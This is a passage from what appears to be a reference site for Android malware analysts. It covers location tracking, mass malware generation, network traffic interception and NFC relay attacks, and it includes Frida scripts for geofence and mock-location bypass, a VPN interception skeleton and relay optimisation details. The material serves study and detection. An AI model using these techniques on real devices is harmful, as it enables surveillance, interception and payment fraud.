location flag at framework level</li> <li>Use a physical device with a SIM from the target country instead of mock GPS</li> <li>Modify the emulator's location through the emulator controls (not via mock provider API)</li> </ul>"},{"location":"attacks/location-tracking/#families-with-location-tracking","title":"Families with Location Tracking","text":"Family Type Location Methods Purpose Pegasus State-sponsored GPS, cell, WiFi, passive Real-time surveillance, movement tracking Predator State-sponsored GPS, cell, WiFi Targeted surveillance Hermit State-sponsored GPS, cell tower Law enforcement surveillance FinSpy State-sponsored GPS, cell, WiFi Dissident/journalist targeting SpyNote RAT GPS, cell Full device surveillance including location SpyAgent Spyware GPS Location tracking alongside crypto wallet theft PJobRAT Targeted GPS Military/government personnel targeting GuardZoo Targeted GPS Military targeting in Middle East AridSpy Targeted GPS Middle East espionage BoneSpy State-sponsored GPS, cell Russian-linked surveillance of Central Asian targets PlainGnome State-sponsored GPS Gamaredon group, targets Russian-speaking in former Soviet states KoSpy State-sponsored GPS North Korean APT targeting Korean/English speakers LightSpy State-sponsored GPS, WiFi Chinese-linked, modular with dedicated location plugin EagleMsgSpy Law enforcement GPS Chinese police surveillance tool GoldPickaxe Banking SIM + locale geofencing Activates only in Thailand/Vietnam Anatsa Banking SIM + IP geofencing Targets specific European countries GodFather Banking Language check Avoids CIS countries Cerberus Banking SIM + locale Avoided CIS countries SpyLoan Predatory lending GPS Collects victim location for intimidation and debt collection DCHSpy Spyware GPS Location tracking as part of surveillance suite FireScam Spyware GPS Telegram impersonation with location exfiltration"},{"location":"attacks/location-tracking/#android-version-timeline","title":"Android Version Timeline","text":"Version API Year Location Change 1.0 1 2008 <code>ACCESS_FINE_LOCATION</code>, <code>ACCESS_COARSE_LOCATION</code> introduced 6.0 23 2015 Location becomes runtime permission (user must grant explicitly) 8.0 26 2017 Background location throttled to a few updates per hour 8.0 26 2017 Background service execution limits kill persistent location services 9.0 28 2018 WiFi scan throttling (foreground: 4/2min, background: 1/30min) 10 29 2019 <code>ACCESS_BACKGROUND_LOCATION</code> introduced as separate permission 10 29 2019 <code>ACCESS_FINE_LOCATION</code> required for WiFi scan results 11 30 2020 Background location can only be granted from Settings (not runtime dialog) 11 30 2020 One-time location permission option added 12 31 2021 Approximate vs precise location choice in permission dialog 12 31 2021 <code>Location.isMock()</code> replaces deprecated <code>isFromMockProvider()</code> 12 31 2021 Bluetooth scan no longer requires location permission 13 33 2022 Foreground service type <code>location</code> must be declared in manifest 14 34 2023 Stricter foreground service type enforcement 15 35 2024 Enhanced background location audit, Play Store review hardened"},{"location":"attacks/location-tracking/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>ACCESS_FINE_LOCATION</code>, <code>ACCESS_COARSE_LOCATION</code>, <code>ACCESS_BACKGROUND_LOCATION</code> in manifest</li> <li><code>foregroundServiceType=\"location\"</code> in service declaration</li> <li><code>FusedLocationProviderClient</code> or <code>LocationManager.requestLocationUpdates()</code> calls</li> <li><code>TelephonyManager.getAllCellInfo()</code>, <code>getCellLocation()</code>, or <code>getNeighboringCellInfo()</code></li> <li><code>TelephonyManager.getSimCountryIso()</code>, <code>getNetworkCountryIso()</code>, <code>getSimOperator()</code> for geofencing</li> <li><code>Locale.getDefault()</code> combined with conditional execution paths</li> <li><code>GeofencingClient</code> or <code>Geofence.Builder</code> usage</li> <li><code>WifiManager.getScanResults()</code> for BSSID-based positioning</li> <li><code>LocationManager.PASSIVE_PROVIDER</code> usage (piggyback tracking)</li> </ul> Dynamic Indicators <ul> <li>Periodic location requests from a background service or WorkManager</li> <li>Cell tower info (<code>getAllCellInfo()</code>) exfiltrated to C2</li> <li>WiFi scan results sent to external geolocation APIs</li> <li>Network requests to IP geolocation services (ipinfo.io, ip-api.com, MaxMind)</li> <li>Location data appearing in C2 traffic (latitude/longitude pairs, MCC/MNC/LAC/CID tuples)</li> <li>App behavior changing based on SIM country or system locale</li> <li>Foreground service with location type running with misleading notification text</li> </ul> Frida: Hook Location Updates <pre><code>Java.perform(function() {\n    var LocationManager = Java.use(\"android.location.LocationManager\");\n    LocationManager.requestLocationUpdates.overload(\n        \"java.lang.String\", \"long\", \"float\", \"android.location.LocationListener\"\n    ).implementation = function(provider, minTime, minDist, listener) {\n        console.log(\"[*] requestLocationUpdates: provider=\" + provider +\n            \" interval=\" + minTime + \"ms minDist=\" + minDist + \"m\");\n        return this.requestLocationUpdates(provider, minTime, minDist, listener);\n    };\n\n    var TelephonyManager = Java.use(\"android.telephony.TelephonyManager\");\n    TelephonyManager.getSimCountryIso.implementation = function() {\n        var result = this.getSimCountryIso();\n        console.log(\"[*] getSimCountryIso() = \" + result);\n        return result;\n    };\n    TelephonyManager.getNetworkCountryIso.implementation = function() {\n        var result = this.getNetworkCountryIso();\n        console.log(\"[*] getNetworkCountryIso() = \" + result);\n        return result;\n    };\n    TelephonyManager.getSimOperator.implementation = function() {\n        var result = this.getSimOperator();\n        console.log(\"[*] getSimOperator() = \" + result);\n        return result;\n    };\n});\n</code></pre> Frida: Spoof SIM Country for Geofence Bypass <pre><code>Java.perform(function() {\n    var TelephonyManager = Java.use(\"android.telephony.TelephonyManager\");\n\n    TelephonyManager.getSimCountryIso.implementation = function() {\n        console.log(\"[*] getSimCountryIso() spoofed to 'de'\");\n        return \"de\";\n    };\n    TelephonyManager.getNetworkCountryIso.implementation = function() {\n        console.log(\"[*] getNetworkCountryIso() spoofed to 'de'\");\n        return \"de\";\n    };\n    TelephonyManager.getSimOperator.implementation = function() {\n        console.log(\"[*] getSimOperator() spoofed to '26201'\");\n        return \"26201\";\n    };\n});\n</code></pre> <p>This spoofs device-side checks but will not bypass server-side IP geofencing. Combine with a VPN exit node in the target country for full geofence bypass. Note that some families cross-validate SIM country against IP geolocation, so both must be consistent.</p> Frida: Bypass Mock Location Detection <pre><code>Java.perform(function() {\n    var Location = Java.use(\"android.location.Location\");\n\n    Location.isFromMockProvider.implementation = function() {\n        return false;\n    };\n\n    try {\n        Location.isMock.implementation = function() {\n            return false;\n        };\n    } catch(e) {}\n});\n</code></pre>"},{"location":"attacks/mass-malware-generation/","title":"Mass Malware Generation","text":"<p>Automated production of Android malware variants at scale through MaaS builder panels, app repackaging pipelines, crypter-as-a-service platforms, and coordinated multi-account Play Store submission. The result is hundreds or thousands of functionally identical malware samples that evade signature-based detection through automated obfuscation, distributed developer accounts, and sheer volume. Kaspersky reported a 196% surge in banking trojan attacks in 2024 (1.24 million attacks, up from 420,000 in 2023).</p> <p>See also: Play Store Evasion, Dynamic Code Loading, C2 Communication</p>"},{"location":"attacks/mass-malware-generation/#techniques","title":"Techniques","text":""},{"location":"attacks/mass-malware-generation/#maas-builder-panels","title":"MaaS Builder Panels","text":"<p>Malware-as-a-Service operators provide web-based builder panels that generate unique APKs per customer with customized targeting, branding, and C2 configuration. Each customer gets a variant that is structurally different enough to evade detection but functionally identical.</p> Platform Price Capabilities Source PhantomOS $799/week or $2,499/month + profit sharing Silent app installs, 2FA interception, AV cloaking, phishing overlays. Operator handles all backend infrastructure (server + Telegram control bot). Client specifies target institution. iVerify Nebula From $300/month Background operation, SMS/call/location exfiltration, automated updates iVerify <p>Builder output includes: APK with rotated cryptographic packers, web panel for managing infected devices, SMS sending, data archive download, multi-device management, analytics dashboard. Many MaaS operators include or integrate with crypting services that rotate packers regularly to update signatures.</p> <p>The SpyLoan ecosystem demonstrates framework-level mass generation. ESET documented 18 SpyLoan apps sharing a common framework: every instance behaves identically due to identical underlying code, with different branding and target regions. From Q2 to Q3 2024, malicious SpyLoan apps and unique infected devices increased by over 75%. McAfee tracked the global scope across Mexico, Indonesia, Thailand, Vietnam, India, Pakistan, Colombia, Peru, Philippines, Egypt, Kenya, Nigeria, and Singapore.</p>"},{"location":"attacks/mass-malware-generation/#apk-binding-services","title":"APK Binding Services","text":"<p>Services that take a legitimate APK and graft malicious code onto it, producing a \"bound\" app that retains original functionality while carrying a malware payload.</p> <p>Zombinder (ThreatFabric, December 2022): Dropper-as-a-service announced March 2022 on darknet. Takes an original APK and \"glues\" obfuscated malicious payload to it with minor modifications. The bound app functions normally until it shows a fake \"update\" prompt; accepting installs Ermac or other payloads. The service claims undetectability at runtime and bypass of Google Play Protect. BleepingComputer and SecurityWeek covered the discovery.</p>"},{"location":"attacks/mass-malware-generation/#app-piggybacking-repackaging-at-scale","title":"App Piggybacking (Repackaging at Scale)","text":"<p>Automated pipelines that take legitimate apps, inject malicious payloads (the \"rider\"), and republish them. About 90% of reported Android malware uses some form of repackaging. A systematic study showed piggybacking is largely automated, with malware writers systematically ensuring necessary permissions are added.</p> <p>The NDSS 2025 \"Automated Mass Malware Factory\" paper combined adversarial examples with piggybacking. Average time to generate an adversarial piggybacked app: 23.4 seconds (12.6s unpacking + 0.08s hooking + 10.6s repackaging). Achieved 88.3% evasion rate against ML-based detectors.</p>"},{"location":"attacks/mass-malware-generation/#dropper-as-a-service","title":"Dropper-as-a-Service","text":"<p>Specialized services that handle the delivery stage, bypassing Android security restrictions so the malware operator can focus on the payload.</p> <p>SecuriDropper (ThreatFabric, November 2023): DaaS that bypasses Android 13 Restricted Settings by using the same session-based <code>PackageInstaller</code> API as legitimate marketplaces. Android cannot distinguish dropper installs from marketplace installs, so the payload freely requests Accessibility Service access. Observed delivering SpyNote and ERMAC.</p>"},{"location":"attacks/mass-malware-generation/#coordinated-multi-account-store-submission","title":"Coordinated Multi-Account Store Submission","text":"<p>Large-scale campaigns using distributed developer accounts to submit hundreds of variants simultaneously, overwhelming Play Store review capacity.</p> <p>Vapor Campaign (IAS Threat Lab / Bitdefender, 2025): 331 malicious apps with over 60 million combined downloads. Multiple developer accounts, each hosting only a handful of apps so takedown of one account has minimal impact. Each publisher used a different ads SDK to obscure the campaign. Evasion: disabled launcher activity after install, renamed to \"Google Voice\" in Settings, used Leanback Launcher (Android TV launcher) for stealth, versioning attack (clean submission, malicious update via C2). Generated 200 million fraudulent ad bid requests daily.</p> <p>Konfety Evil Twin Operation (HUMAN Security, 2024): Over 250 decoy apps on Google Play acting as \"evil twins\" for ad-fraud malware. At peak, the operation generated 10 billion programmatic requests per day. Decoy apps on the store appeared clean; the actual malicious variants were distributed via malvertising, compromised WordPress sites, Docker Hub, Facebook, Google Sites, and OpenSea. Evil twin network traffic functionally identical to decoy twin traffic. Latest variants use malformed APK files that crash analysis tools while installing normally on devices.</p>"},{"location":"attacks/mass-malware-generation/#crypter-as-a-service","title":"Crypter-as-a-Service","text":"<p>Third-party services that obfuscate malware APKs to evade AV detection. Operators submit their malware and receive a \"crypted\" version with modified signatures, encrypted strings, and junk code injection.</p> <p>DroidMorph (academic tool) demonstrated the fragility of detection: a morphing tool generating 1,771 malware variants achieved a 51.4% detection rate, meaning half of the generated variants evaded detection entirely. The tool applied automated transformations: class renaming, method shuffling, string encryption, resource randomization.</p> <p>Commercial crypter services rotate obfuscation techniques regularly. Many MaaS operators bundle crypting with their builder panels, updating malware signatures to remain stealthy against AV engines and Play Protect. Sekoia documented two types: scantime crypters (obfuscate before execution) and runtime crypters (decrypt portions into memory during execution). The first academic study of the underground crypter marketplace (arXiv:2405.11876) found monthly subscriptions ranging from $50 to $300+ on HackForums.</p>"},{"location":"attacks/mass-malware-generation/#automated-evasion-tools","title":"Automated Evasion Tools","text":"<p>Open-source and academic tools that automate APK transformation to evade detection:</p> Tool Year Technique Impact AVPASS 2017 (Black Hat USA) Leaks AV detection models, then uses perturbation to bypass. Three components: query function, variant generator, data analyzer. Generated apps detected only 6% of the time. 56 of 58 AVs bypassed almost always. Obfuscapk 2020 Open-source black-box obfuscation. Decompile via apktool, apply obfuscation on smali/resources/manifest, recompile. VirusTotal detection dropped from 91% to 71% with medium obfuscation AAMO 2017 17 obfuscation techniques: string encryption, renaming, reordering, reflection, nop insertion, arithmetic branching Automated pipeline: decompile -&gt; obfuscate -&gt; recompile -&gt; re-sign"},{"location":"attacks/mass-malware-generation/#source-code-leaks-as-force-multipliers","title":"Source Code Leaks as Force Multipliers","text":"<p>When a banking trojan's source code leaks, it instantly enables mass variant generation by any operator. The leaked code typically includes builder tools, C2 panels, and obfuscation modules.</p> <p>ERMAC 3.0 (BleepingComputer): Leaked archive contained PHP/Laravel C2 backend, React operator panel, Go-powered exfiltration server, Docker deployment files, Android APK builder, and obfuscation module. Targets 700+ apps. Lineage: Cerberus (leaked Sept 2020) -&gt; Alien -&gt; ERMAC -&gt; Hook -&gt; ERMAC 3.0.</p> <p>See Source Code Leaks in the malware section for the full timeline of leaks and their downstream impact.</p>"},{"location":"attacks/mass-malware-generation/#families-using-mass-generation","title":"Families Using Mass Generation","text":"Family Scale Technique Source Joker 1,700+ variants Automated code mutation, Play Store submission across hundreds of developer accounts CERT Polska 2024 analysis SpyLoan 18+ apps, 12M+ downloads Shared framework, templated app generation, mass geographic targeting ESET, McAfee Necro 11M+ devices, multi-app Coral SDK embedded across multiple legitimate apps Kaspersky Harly Millions of downloads across dozens of apps Templated utility apps (games, wallpapers, cameras) Google Play campaigns SpyNote Explosion post-leak Builder leaked publicly; accessible to low-skill operators Zimperium Rafel RAT 120+ campaigns, 10+ threat actors Open-source release enabled mass adoption Check Point Vapor campaign 331 apps, 60M downloads Distributed developer accounts, templated utility apps Bitdefender Konfety 250+ decoy apps Evil twin architecture: clean store apps + sideloaded malicious variants HUMAN Security Mamont Custom variants per operator MaaS model generates unique variant per customer for a fee Kaspersky"},{"location":"attacks/mass-malware-generation/#scale","title":"Scale","text":"<p>Google blocked 2.36 million policy-violating apps and banned 158,000 developer accounts in 2024. Play Protect scans 200 billion apps daily and identified 13 million new malicious apps from outside Google Play. Despite this, the volume of malicious submissions continues to increase year over year (2022: 1.5M blocked, 173K banned; 2023: 2.28M blocked, 333K banned; 2024: 2.36M blocked, 158K banned).</p>"},{"location":"attacks/mass-malware-generation/#the-economics","title":"The Economics","text":"<p>Mass generation is economically rational because the marginal cost of producing an additional variant is near zero while the marginal cost of detecting each variant is significant.</p> Factor Attacker Cost Defender Cost Generate new variant Seconds (automated builder) Hours (manual analysis) or expensive ML retraining New developer account $25 (Google Play fee) N/A Crypter service $50-100/month Signature updates across entire AV fleet MaaS subscription $300-2,500/month Full-time analyst + infrastructure <p>The asymmetry is structural. Kaspersky's 2024 data shows the scale of the problem: despite Google removing 2.3 million apps from the Play Store in 2024, banking trojan attacks nearly tripled.</p>"},{"location":"attacks/network-traffic-interception/","title":"Network Traffic Interception","text":"<p>Intercepting, modifying, and redirecting network traffic on Android devices through VPN service abuse, DNS manipulation, proxy configuration, and certificate store attacks. Malware uses these techniques to capture credentials transmitted over HTTPS, redirect banking traffic to phishing servers, and exfiltrate data through controlled network tunnels.</p> <p>See also: C2 Communication, WebView Exploitation, Phishing Techniques</p> <p>Requirements</p> Requirement Details VPN interception <code>BIND_VPN_SERVICE</code> (user must approve VPN connection dialog) DNS manipulation WiFi network access + router default credential exploitation Proxy configuration <code>BIND_ACCESSIBILITY_SERVICE</code> or <code>BIND_DEVICE_ADMIN</code> to modify WiFi settings Certificate installation User CA: Settings navigation; System CA: root access (Android 14+ requires APEX modification)"},{"location":"attacks/network-traffic-interception/#vpnservice-abuse","title":"VpnService Abuse","text":""},{"location":"attacks/network-traffic-interception/#how-vpnservice-works","title":"How VpnService Works","text":"<p>Android's <code>VpnService</code> API creates a TUN (network tunnel) interface that captures all device traffic. The app receives raw IP packets, can inspect, modify, or forward them to any destination. Only one VPN service can be active at a time.</p> <pre><code>public class MaliciousVpn extends VpnService {\n    @Override\n    public void onCreate() {\n        Builder builder = new Builder();\n        builder.addAddress(\"10.0.0.2\", 32);\n        builder.addRoute(\"0.0.0.0\", 0);\n        ParcelFileDescriptor tun = builder.establish();\n    }\n}\n</code></pre> <p>The <code>establish()</code> call triggers a system dialog requiring explicit user consent. Once approved, all network traffic flows through the TUN interface. The VPN icon appears in the status bar.</p>"},{"location":"attacks/network-traffic-interception/#legitimate-architecture","title":"Legitimate Architecture","text":"<p>NetGuard and TrackerControl (a NetGuard fork) demonstrate the legitimate architecture: a local VPN that routes all traffic through the app's process for per-app firewall filtering and tracker blocking. No traffic leaves the device through an external VPN tunnel.</p> <p>This same architecture enables malicious use. An app could capture all HTTP/HTTPS traffic (TLS handshake visible, payload encrypted), DNS queries (in plaintext unless DoH/DoT), and per-app network activity. For TLS-encrypted traffic, the malware would additionally need to install a certificate to perform MITM decryption.</p>"},{"location":"attacks/network-traffic-interception/#malicious-vpn-apps","title":"Malicious VPN Apps","text":"App/Campaign Scale Technique Source Free VPN apps (28 flagged) 700M+ combined users Security flaws, traffic logging, China-linked ownership Malwarebytes 2025 Proxylib SDK Embedded in VPN apps Converts devices into residential proxy nodes HUMAN Security MVDroid study 14,000+ VPN apps analyzed 18% did not encrypt traffic, 38% injected malware/ads PMC/Neural Networks study"},{"location":"attacks/network-traffic-interception/#per-app-traffic-control","title":"Per-App Traffic Control","text":"<p><code>VpnService.Builder</code> supports per-app routing:</p> <ul> <li><code>addAllowedApplication(String packageName)</code>: Route only this app's traffic through VPN</li> <li><code>addDisallowedApplication(String packageName)</code>: Exclude this app from VPN</li> </ul> <p>Malware can selectively intercept only banking app traffic while leaving other traffic untouched, reducing the chance of detection through general browsing disruption.</p>"},{"location":"attacks/network-traffic-interception/#dns-manipulation","title":"DNS Manipulation","text":""},{"location":"attacks/network-traffic-interception/#roaming-mantis-dns-changer","title":"Roaming Mantis DNS Changer","text":"<p>Kaspersky documented Roaming Mantis (also known as Shaoye, using the Wroba.o/MoqHao/XLoader malware) implementing a DNS changer function in September 2022 targeting WiFi routers used primarily in South Korea.</p> <p>The attack flow:</p> <ol> <li>Malware on the infected Android device scans the local network for the WiFi router gateway</li> <li>Attempts to log in using default admin credentials (e.g., <code>admin:admin</code>) common to consumer routers</li> <li>If successful, changes the router's DNS settings to attacker-controlled DNS servers</li> <li>All devices on the network now resolve domains through the rogue DNS</li> <li>Banking domains resolve to phishing servers that serve credential harvesting pages</li> </ol> <p>The DNS changer generates URL queries with rogue DNS IPs tailored to the specific router model detected. The attacker can then redirect to malicious hosts and interfere with security product updates from any device on the compromised network.</p>"},{"location":"attacks/network-traffic-interception/#on-device-dns-modification","title":"On-Device DNS Modification","text":"<p>On rooted devices, malware can modify <code>/etc/hosts</code> or DNS resolver configuration directly. On non-rooted devices, the VpnService approach is the primary vector: the VPN intercepts DNS queries and returns forged responses pointing to attacker-controlled IPs.</p> <p>Android 9 introduced Private DNS (DNS-over-TLS), and Android 13 added DNS-over-HTTPS support. These encrypt DNS queries, but malware running as a VPN service intercepts traffic before it reaches the DNS resolver, so encrypted DNS does not protect against on-device VPN-based interception.</p>"},{"location":"attacks/network-traffic-interception/#proxy-configuration-attacks","title":"Proxy Configuration Attacks","text":""},{"location":"attacks/network-traffic-interception/#wifi-proxy-manipulation","title":"WiFi Proxy Manipulation","text":"<p>Malware with accessibility service or device admin privileges can modify WiFi proxy settings to route HTTP(S) traffic through an attacker-controlled proxy:</p> <ol> <li>Accessibility-based: Navigate <code>Settings &gt; WiFi &gt; [Network] &gt; Proxy</code> and configure manual proxy pointing to attacker server</li> <li>Device admin: Use <code>DevicePolicyManager</code> global proxy setting</li> <li>Programmatic: <code>WifiManager</code> API to modify network configuration (requires <code>CHANGE_WIFI_STATE</code>)</li> </ol> <p>Proxy trojans dynamically configure proxy settings only when triggered by C2, minimizing their footprint and making detection harder during static analysis.</p>"},{"location":"attacks/network-traffic-interception/#residential-proxy-conversion","title":"Residential Proxy Conversion","text":"<p>Some malware converts infected devices into residential proxy nodes. The device's IP address is sold to proxy services, routing third-party traffic through the victim's connection. The Proxylib SDK was embedded in multiple VPN apps on the Play Store for this purpose.</p>"},{"location":"attacks/network-traffic-interception/#certificate-store-attacks","title":"Certificate Store Attacks","text":""},{"location":"attacks/network-traffic-interception/#user-certificate-installation","title":"User Certificate Installation","text":"<p>Installing a user-trusted CA certificate enables MITM decryption of HTTPS traffic. Android 7.0+ changed the default trust behavior:</p> Android Version User CA Trust Behavior Pre-7.0 User CAs trusted by all apps by default 7.0+ User CAs trusted only by apps that explicitly opt in via <code>network_security_config.xml</code> 7.0+ System CAs still trusted by all apps <p>This means that on Android 7.0+, installing a user CA only intercepts traffic from apps that have <code>&lt;trust-anchors&gt;</code> configured to include user certificates. Most banking apps do not, making user CA installation insufficient for banking credential interception.</p>"},{"location":"attacks/network-traffic-interception/#system-certificate-installation","title":"System Certificate Installation","text":"<p>Installing a system-level CA certificate enables universal HTTPS interception. This requires root access to write to the system certificate store.</p> Android Version System CA Store Location Root Write Method Pre-14 <code>/system/etc/security/cacerts/</code> Remount <code>/system</code> as read-write 14+ <code>/apex/com.android.conscrypt/cacerts/</code> (immutable) APEX mount cannot be remounted <p>Android 14 moved system certificates into the Conscrypt APEX module, making them immutable even with root access. The entire <code>/apex</code> filesystem is read-only. HTTP Toolkit documented workarounds involving mount namespace manipulation, but these are fragile and process-specific.</p> <p>Android 14's change also enables remote certificate store updates via Google Play system updates, allowing Google to revoke compromised CAs without waiting for OEM OTA updates.</p>"},{"location":"attacks/network-traffic-interception/#certificate-pinning","title":"Certificate Pinning","text":"<p>Apps can additionally implement certificate pinning to reject any CA not matching a specific pin, including system CAs:</p> <pre><code>&lt;network-security-config&gt;\n    &lt;domain-config&gt;\n        &lt;domain includeSubdomains=\"true\"&gt;bank.example.com&lt;/domain&gt;\n        &lt;pin-set expiration=\"2025-01-01\"&gt;\n            &lt;pin digest=\"SHA-256\"&gt;base64EncodedPin=&lt;/pin&gt;\n        &lt;/pin-set&gt;\n    &lt;/domain-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>Pinning is bypassed by hooking the TLS verification at runtime (Frida, Xposed), patching the <code>network_security_config.xml</code>, or hooking <code>TrustManager</code> implementations. Malware performing MITM does not typically need to bypass pinning because it controls the device and can hook the verification process.</p>"},{"location":"attacks/network-traffic-interception/#network-security-configuration-evolution","title":"Network Security Configuration Evolution","text":"Android Version Change Security Impact Pre-7.0 All CAs (system + user) trusted by default User CA MITM trivial 7.0 Network Security Config introduced; user CAs untrusted by default MITM requires root for system CA or app-specific config 7.0 Certificate pinning declarative support Apps can pin without code changes 9.0 Cleartext (HTTP) traffic blocked by default Apps must explicitly allow HTTP via config 9.0 Private DNS (DNS-over-TLS) support DNS queries encrypted (when configured) 10 TLS 1.3 enabled by default Stronger encryption, but irrelevant if VPN intercepts 13 DNS-over-HTTPS support DNS encryption alternative 14 System CA store moved to immutable APEX Even root cannot permanently modify trust store 14 Updatable root certificates via Google Play Faster CA revocation response"},{"location":"attacks/network-traffic-interception/#families-using-network-interception","title":"Families Using Network Interception","text":"Family Technique Target Source MoqHao / Roaming Mantis WiFi router DNS hijacking South Korean users Kaspersky BTMOB RAT Accessibility + proxy configuration Banking apps Cyble Proxy trojans (generic) VpnService residential proxy Device IP monetization Zimperium Mandrake Certificate installation + traffic routing Targeted surveillance Kaspersky Stalkerware (generic) MDM profile with proxy + CA cert Domestic surveillance Commercial stalkerware vendors"},{"location":"attacks/network-traffic-interception/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>BIND_VPN_SERVICE</code> permission in manifest</li> <li><code>VpnService</code> subclass with <code>establish()</code> call</li> <li>Router default credential strings (e.g., <code>admin:admin</code>, <code>admin:password</code>)</li> <li>DNS server IP addresses hardcoded in code</li> <li><code>WifiManager</code> configuration modification calls</li> <li><code>KeyStore</code> or <code>CertificateFactory</code> usage for CA certificate installation</li> <li><code>X509TrustManager</code> custom implementation that accepts all certificates</li> </ul> Dynamic Indicators <ul> <li>VPN icon appearing in status bar without user-initiated VPN connection</li> <li>DNS queries resolving to unexpected IP addresses</li> <li>WiFi proxy settings changed without user action</li> <li>New user CA certificate appearing in Settings &gt; Security &gt; Trusted Credentials</li> <li>All HTTPS traffic routing through a single proxy IP</li> <li>Router DNS settings changed after malware installation</li> </ul>"},{"location":"attacks/nfc-relay/","title":"NFC Relay Attacks","text":"<p>Relaying NFC (Near Field Communication) data from a victim's payment card to an attacker-controlled device for unauthorized transactions. An emerging attack category first seen in Android malware in 2024, enabling ATM cash withdrawal and POS fraud using cloned contactless card data.</p> <p>Requirements</p> Requirement Details Permission NFC access (normal permission, auto-granted) Condition Victim places physical payment card against infected device Infrastructure Second device (mule) with NFC and HCE (Host Card Emulation) near ATM or POS terminal"},{"location":"attacks/nfc-relay/#how-it-works","title":"How It Works","text":""},{"location":"attacks/nfc-relay/#attack-flow","title":"Attack Flow","text":"<ol> <li>Malware phishes the victim for their card PIN via a fake banking WebView</li> <li>Malware instructs the victim to hold their physical payment card against the phone (\"verify your card\")</li> <li>The infected device reads the card's NFC data</li> <li>Card data is relayed in real time to a mule's device via a C2 server</li> <li>The mule's device emulates the card using HCE at a physical ATM or POS terminal</li> <li>The mule enters the stolen PIN and withdraws cash or makes purchases</li> </ol> <p>The relay happens in real time. The NFC protocol has tight timing requirements, so the relay infrastructure must be low-latency.</p>"},{"location":"attacks/nfc-relay/#technical-mechanism","title":"Technical Mechanism","text":"Component Role Victim device Reads NFC tag data from the physical card using Android's NFC stack Relay server Forwards NFC APDU (Application Protocol Data Unit) commands between victim and mule devices Mule device Emulates the card using Android's Host Card Emulation (HCE) API, responding to the POS/ATM terminal as if it were the real card <p>The key insight: Android's HCE API allows any app to respond to NFC readers as if it were a contactless card. By relaying the real card's responses through a mule device, the ATM or POS terminal cannot distinguish the relay from a genuine tap.</p>"},{"location":"attacks/nfc-relay/#nfcgate","title":"NFCGate","text":"<p>NFCGate is an open-source academic NFC relay tool developed at TU Darmstadt for security research. It provides the relay infrastructure that NGate repurposed for malicious use. NFCGate itself is a legitimate research tool; the malware weaponizes its relay capability.</p>"},{"location":"attacks/nfc-relay/#families-using-this-technique","title":"Families Using This Technique","text":"Family Year Approach Target NGate 2024 NFCGate-based relay, credential phishing via WebView Czech banks, ATM withdrawal RatOn 2025 NFC relay + ATS combination, crypto wallet seed extraction Czech/Slovak banks, POS fraud GhostTap 2025 Scanner/tapper pairs, Telegram-based data exfiltration Multi-region, POS fraud SuperCard 2025 NFC relay with expanded card type support European banks <p>Zimperium identified 760+ malicious apps exploiting NFC and HCE by late 2025, with 70+ C2 servers targeting Russia, Poland, Czech Republic, Slovakia, and other European countries.</p>"},{"location":"attacks/nfc-relay/#evolution","title":"Evolution","text":"<p>NGate pioneered the approach in 2024 with a straightforward NFC relay for ATM withdrawal. RatOn evolved the technique in 2025 by combining NFC relay with ATS (Automated Transfer System) capabilities, enabling both physical card cloning and automated bank transfers from a single trojan. ESET's H2 2025 threat report documented an 87% increase in NFC threats on Android and a 35x increase in NFC-based fraud.</p>"},{"location":"attacks/nfc-relay/#practical-limitations","title":"Practical Limitations","text":"Limitation Details Physical card required Victim must physically tap their card against the infected device Real-time relay NFC protocol timing constraints require low-latency relay infrastructure Mule required An in-person accomplice must be at an ATM or POS terminal during the relay Single-use risk Some banks block cards after suspicious contactless transactions Geographic constraint Mule must be at a physical terminal; cannot be done fully remotely <p>Despite these constraints, the attack is effective because contactless payment terminals perform limited verification. The terminal trusts the HCE-emulated card as long as the relayed APDU responses are valid.</p>"},{"location":"attacks/nfc-relay/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>android.nfc</code> and <code>android.nfc.cardemulation</code> imports</li> <li><code>HostApduService</code> implementation (HCE)</li> <li><code>AID_GROUP</code> declarations in XML for payment card emulation</li> <li>WebSocket or raw TCP connections for real-time data relay</li> <li>UI strings asking user to \"tap\" or \"hold\" their card</li> </ul> Dynamic Indicators <ul> <li>NFC read operations followed by immediate network transmission</li> <li>HCE service activation without legitimate payment functionality</li> <li>WebView loading card PIN entry forms</li> </ul>"},{"location":"attacks/nfc-relay/#apdu-command-flow","title":"APDU Command Flow","text":"<p>NFC relay attacks work at the APDU (Application Protocol Data Unit) layer defined by ISO 7816-4. Every contactless EMV transaction follows a structured sequence of command-response pairs between the terminal and card. In a relay attack, the mule device's HCE service receives commands from the terminal and forwards them through the relay infrastructure to the victim's device, which passes them to the real card and returns the responses.</p>"},{"location":"attacks/nfc-relay/#emv-transaction-sequence","title":"EMV Transaction Sequence","text":"Step APDU Command Purpose Relayed or Cacheable 1 <code>SELECT (PPSE)</code> Terminal selects Proximity Payment Systems Environment to discover available payment apps Cacheable -- response is static per card 2 <code>SELECT (AID)</code> Terminal selects a specific payment application (e.g., Visa AID <code>A0000000031010</code>) Cacheable -- AID list doesn't change 3 <code>GET PROCESSING OPTIONS</code> Terminal sends transaction parameters (amount, currency, date); card returns Application Interchange Profile (AIP) and Application File Locator (AFL) Must relay -- card may use terminal-provided data to determine CDA/DDA mode 4 <code>READ RECORD</code> (multiple) Terminal reads card records indicated by AFL: cardholder name, PAN, expiry, certificates Cacheable -- these records are static 5 <code>GET DATA</code> Terminal requests additional data objects (e.g., ATC, log entries) Depends -- ATC (Application Transaction Counter) is dynamic 6 <code>GENERATE AC</code> Terminal requests an Application Cryptogram; card produces ARQC using its secret key, the ATC, and transaction data Must relay -- this is the dynamic cryptogram that authenticates the card <p>The critical insight for relay optimization: steps 1, 2, and 4 return static data that can be cached after the first relay session. This reduces the number of round trips needed during subsequent attacks. Steps 3 and 6 must always be relayed because they involve transaction-specific dynamic data. Step 6 is the most time-sensitive -- the terminal expects the cryptogram response within a tight window, so relay latency directly determines success or failure.</p>"},{"location":"attacks/nfc-relay/#timing-constraints","title":"Timing Constraints","text":"<p>The EMV contactless specification allows around 500ms for the full transaction. Each relay hop adds latency:</p> <ul> <li>Card-to-victim-device: near-instant (local NFC)</li> <li>Victim-device-to-relay-server: 30-100ms (network dependent)</li> <li>Relay-server-to-mule-device: 30-100ms</li> <li>Mule-device-to-terminal: near-instant (local NFC)</li> </ul> <p>A single round trip through the relay adds 60-200ms. With multiple APDU exchanges required, the total relay overhead can approach or exceed the terminal's 